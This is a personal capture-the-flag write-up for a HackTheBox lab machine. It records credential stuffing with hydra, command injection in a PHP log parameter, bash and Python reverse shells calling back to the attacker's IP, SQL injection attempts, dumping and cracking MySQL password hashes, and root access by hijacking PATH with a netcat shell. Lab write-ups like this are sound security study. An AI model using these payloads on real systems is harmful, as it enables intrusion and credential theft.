## Info

Can execute these in bash to set variables, which will be used later on in this script.

    ATTACKER=10.10.14.57
    VICTIM=10.10.11.104

## Recon

    bash ../../scripts/discovery/first-scan.sh $VICTIM > recon.txt

Looks like port 22 and 80 are open.

### Port 80

There's a login page, you can `POST http://10.10.11.104/login.php username=asdf&password=ASDF`.

Probably try cred stuffing?

#### Subdir scan

    bash ../../scripts/discovery/subdirectory-scan.sh $VICTIM

#### Cred stuffing

    hydra -l admin -P ~/Git/SecLists/Passwords/Leaked-Databases/rockyou-75.txt $VICTIM -V http-form-post '/login.php:username=^USER^&password=^PASS^:S=Location' -t 64

Apparently it worked. `admin:asdfasdf`. Wow! (Note: Password seems to change on box reboot.)

## Next steps

We have access to the admin interface. Looks like there's a few other users, a way to upload files, and a way to view who downloaded files.

### Downloaded PHP

Some more goodies exist in the code, like hardcoded secrets, but I don't care enough to review them. Command injection may be enough.

-   .`/downloaded-files/siteBackup/logs.php` line 19, command injection
    -   ```php
        $output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
        ```

This is all we need to get a shell.

## Reverse shell via command injection

Run this bash command to generate a payload.

This payload is to be sent via HTTP POST into the 'delim' parameter, at this page: `/file_logs.php`

    echo "comma; bash -i >& /dev/tcp/$ATTACKER/6969 0>&1"

e.g:

    comma; bash -i >& /dev/tcp/10.10.14.57/6969 0>&1

Then, run this in JavaScript to modify the form (change IP if needed):

    $('option').value = "comma && bash -i >& /dev/tcp/10.10.14.57/6969 0>&1"
    $('option').innerHTML = "payload ;)"

Then, run this on the attacker machine to listen for connections:

    nc -lvp 6969

And submit the form.

And the reverse shell doesn't work. Fuck.

Does the command injection work at all?

Try:

    $('option').value = "comma && sleep 20"
    $('option').innerHTML = "payload ;)"

Sleep works... So the command injection works. Perhaps we just can't make a connection back to the attacker.

## SQLMap

Log in as admin, and get your PHPSESSID cookie.

    console.log(document.cookie)
    PHPSESSID=qv2nlssejob21t9uq9jq67413c

Then run:

    PHPSESSID=whatever
    sqlmap http://$VICTIM/files.php --cookie="PHPSESSID=$PHPSESSID" --forms --method=POST

Yay, nothing happened ;_;

Let's try `accounts.php`...

    sqlmap http://$VICTIM/accounts.php --cookie="PHPSESSID=$PHPSESSID" --forms --method=POST

Nothing either.

## $fileName not parameterized

If I upload to `/files.php`, and the name of the file is an SQL injection payload, I may be able to cause SQLi.

Well, uploading `' or 1=1;--` causes an error.

This is the raw request sent to the server (looks weird due to it being a file upload):

    -----------------------------42444973397781975353726677533
    Content-Disposition: form-data; name="userData"; filename="' or 1=1;--"
    Content-Type: application/octet-stream

    please upload me 😔
    -----------------------------42444973397781975353726677533--


Let's try to make a better payload.

We control `$fileName` in this code:

```php
$sql = "INSERT INTO files(name, size, data, user) VALUES('{$fileName}', '{$fileSize}', '{$fileData}', '{$_SESSION['user']}')";
```

So we could spoof records with a payload thusly:

    filename69', '69', 'good content', 'admin');--

Doesn't work.

## SQLMap again

https://www.liquidmatrix.org/blog/sql-injection-using-sqlmap-multipartform-data-encoding/

Apparently we're supposed to use a file containing POST data as a template.

    sqlmap --cookie="PHPSESSID=$PHPSESSID" -r payloads/sqlmap-request.txt --method=POST -p "userData"

Still not working.

Fuck it, time to cheat, hooray!

## cheaty cheaty

<https://medium.com/acm-juit/previse-htb-writeup-a3d0acecb937>

Apparently I'm supposed to use a different method of getting reverse shell.

### reverse shell part 2

Attacker runs:

    nc -lvp 6969

Victim (on <http://10.10.11.104/file_logs.php>):

    $('option').value = `delim=comma;export RHOST="10.10.14.57";export RPORT=6969;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`
    $('option').innerHTML = "payload ;)"

It works, I got shell! I should keep a list of different reverse shell payloads since the bash one doesn't always work.

## in da shell

Looks like there's a user called m4lwhere.

## MySQL

Note: This value

    $1$🧂llol$

Is used to encrypt database passwords with php `crypt` function. May be useful later. EDIT: no, it's a salt.

Also, we can now connect to the MySQL database. Look at `config.php` for creds.

    mysql -u root -p'mySQL_p@ssw0rd!:)'
    show databases;
    use previse;
    show tables;
    select * from accounts;

    +----+----------+------------------------------------+---------------------+
    | id | username | password                           | created_at          |
    +----+----------+------------------------------------+---------------------+
    |  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
    |  2 | userz    | $1$🧂llol$Wjo5WuNanNDwUu4kuNMCB. | 2022-01-01 19:24:51 |
    |  3 | admin    | $1$🧂llol$vEWfJq7ewIW8g5ru0hBxv. | 2022-01-01 19:30:36 |
    +----+----------+------------------------------------+---------------------+

### Cracking mysql hashes

    john downloaded-files/hashes.mysql.txt --format=md5crypt-long
    john downloaded-files/hashes.mysql.txt --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt
    john downloaded-files/hashes.mysql.txt --show

Results:

    m4lwhere:ilovecody112235!
    userz:userz
    admin:asdfasdf

### SSH

    ssh m4lwhere@$VICTIM

    cat ~/user.txt

Yay, user flag!

## root

    sudo -l

We can access one script at `/opt/scripts/access_backup.sh`.

I cheated here, because I have no idea how to escalate permissions from this.

<https://pingback.com/nap0/previse-writeup-hackthebox1>

Apparently you're supposed to make a script called `date` and put it on the path.

Attacker runs:

    nc -lvp 6969

Victim runs:
    
    cd /dev/shm/
    echo "nc 10.10.14.57 6969 -e /bin/bash" > date
    chmod 777 date
    export PATH=/dev/shm:$PATH
    sudo /opt/scripts/access_backup.sh

And you should get root shell.